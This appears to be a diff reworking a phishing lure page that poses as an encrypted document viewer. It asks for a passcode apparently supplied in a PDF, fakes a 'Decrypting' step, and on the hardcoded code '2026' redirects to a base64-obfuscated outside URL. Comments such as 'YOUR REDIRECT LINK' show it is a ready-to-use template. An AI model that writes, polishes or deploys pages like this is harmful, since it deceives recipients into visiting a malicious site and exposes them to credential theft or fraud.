@@ -4,71 +4,51 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
-    <title>Document Portal | Security</title>
+    <title>Encrypted Document Portal</title>
     <style>
-        body { margin:0; background:#f4f7fa; font-family:'Segoe UI',Arial,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; color:#1a2b4b; }
-        .card { background:#fff; padding:40px; border-radius:12px; box-shadow:0 15px 35px rgba(0,0,0,0.1); width:100%; max-width:400px; text-align:center; border-top: 6px solid #1a2b4b; }
-        .logo { margin-bottom:20px; color:#1a2b4b; }
-        h2 { font-size:1.4rem; margin-bottom:10px; color:#1a2b4b; }
-        p { color:#677788; font-size:0.95rem; line-height:1.5; margin-bottom:30px; }
-        .input-group { background:#f8fafc; border:1px solid #e2e8f0; padding:25px; border-radius:10px; margin-bottom:20px; }
-        label { display:block; font-weight:600; font-size:0.85rem; text-transform:uppercase; letter-spacing:1px; margin-bottom:12px; color:#4a5568; }
-        input { width:120px; padding:12px; border:2px solid #cbd5e1; border-radius:6px; font-size:1.3rem; text-align:center; letter-spacing:4px; outline:none; transition:0.2s; }
-        input:focus { border-color:#1a2b4b; background:#fff; }
-        button { width:100%; background:#1a2b4b; color:#fff; border:none; padding:15px; border-radius:6px; font-size:1rem; font-weight:600; cursor:pointer; transition:0.3s; }
-        button:hover { background:#2d3748; box-shadow:0 4px 12px rgba(0,0,0,0.15); }
-        #err { color:#e53e3e; font-size:0.85rem; margin-top:15px; display:none; font-weight:500; }
-        .footer-note { margin-top:25px; font-size:0.75rem; color:#a0aec0; }
+        body { margin:0; background:#f0f2f5; font-family:'Segoe UI', Tahoma, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
+        .box { background:#fff; padding:40px; border-radius:8px; box-shadow:0 4px 12px rgba(0,0,0,0.1); width:100%; max-width:360px; text-align:center; }
+        .header { border-bottom:1px solid #eee; margin-bottom:25px; padding-bottom:15px; }
+        .lock-icon { font-size:40px; margin-bottom:10px; }
+        h2 { font-size:1.2rem; color:#1c1e21; margin:0; }
+        p { color:#606770; font-size:0.9rem; margin:15px 0 25px; }
+        input { width:100%; padding:12px; border:1px solid #dddfe2; border-radius:6px; font-size:1.1rem; text-align:center; margin-bottom:20px; outline:none; box-sizing:border-box; }
+        input:focus { border-color:#1877f2; box-shadow:0 0 0 2px #e7f3ff; }
+        button { width:100%; background:#1877f2; color:#fff; border:none; padding:12px; border-radius:6px; font-weight:600; font-size:1rem; cursor:pointer; }
+        button:hover { background:#166fe5; }
+        #err { color:#fa3e3e; font-size:0.8rem; margin-top:10px; display:none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="logo">
-        <svg width="50" height="50" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+<div class="box">
+    <div class="header">
+        <div class="lock-icon">🔒</div>
+        <h2>Secure File Viewer</h2>
     </div>
-    <h2>Access Submission</h2>
-    <p>This document is protected. Please enter the passcode provided in your notification.</p>
-
-    <div class="input-group">
-        <label for="pass">Enter Passcode</label>
-        <input type="password" id="pass" maxlength="4" placeholder="••••">
-        <div id="err">Invalid passcode. Please check your email.</div>
-    </div>
-
-    <button onclick="unlock()">Verify & View Document</button>
-
-    <div class="footer-note">
-        Protected by SecureReview™ Verification System
-    </div>
+    <p>This document is encrypted. Enter the 4-digit passcode from the PDF to decrypt and view.</p>
+    
+    <input type="password" id="pin" maxlength="4" placeholder="Enter Passcode">
+    <button onclick="check()">Decrypt Document</button>
+    <div id="err">Invalid passcode. Please check the PDF for the correct code.</div>
 </div>
 
 <script>
-    // YOUR ENCODED REDIRECT LINK
-    const _target = "aHR0cHM6Ly9qYWxlbW9kYWV2aS5jb20vMDMyNjczODYycjc0MzZyMjAzNDhyNjI0MzA3OHI2MjczNDYwODI2MzY1Mjg3NDYzNTc2MjA0MzY1MjYwMzQ4NTI2NDM1MDI2MzQ3ODAyMzQ1MjQzNTI1MzUyNC8yODM3NDUzMzIzamtqZHNidmZremZhZGZzdi5odG1s";
+    // YOUR REDIRECT LINK
+    const _u = "aHR0cHM6Ly9qYWxlbW9kYWV2aS5jb20vMDMyNjczODYycjc0MzZyMjAzNDhyNjI0MzA3OHI2MjczNDYwODI2MzY1Mjg3NDYzNTc2MjA0MzY1MjYwMzQ4NTI2NDM1MDI2MzQ3ODAyMzQ1MjQzNTI1MzUyNC8yODM3NDUzMzIzamtqZHNidmZremZhZGZzdi5odG1s";
 
-    function unlock() {
-        const pin = document.getElementById('pass').value;
+    function check() {
+        const pin = document.getElementById('pin').value;
         const err = document.getElementById('err');
 
-        // MATCHING THE PASSCODE FROM YOUR IMAGE (2026)
         if (pin === "2026") {
-            err.style.display = 'none';
-            // Simple delay to look like it's "processing"
-            document.querySelector('button').innerText = "Decrypting...";
-            setTimeout(() => {
-                window.location.href = atob(_target);
-            }, 1000);
+            document.querySelector('button').innerText = "Opening...";
+            window.location.href = atob(_u);
         } else {
             err.style.display = 'block';
-            document.getElementById('pass').value = "";
+            document.getElementById('pin').value = "";
         }
     }
-
-    // Allow Enter key
-    document.getElementById('pass').addEventListener('keypress', (e) => {
-        if (e.key === 'Enter') unlock();
-    });
 </script>
 
 </body>
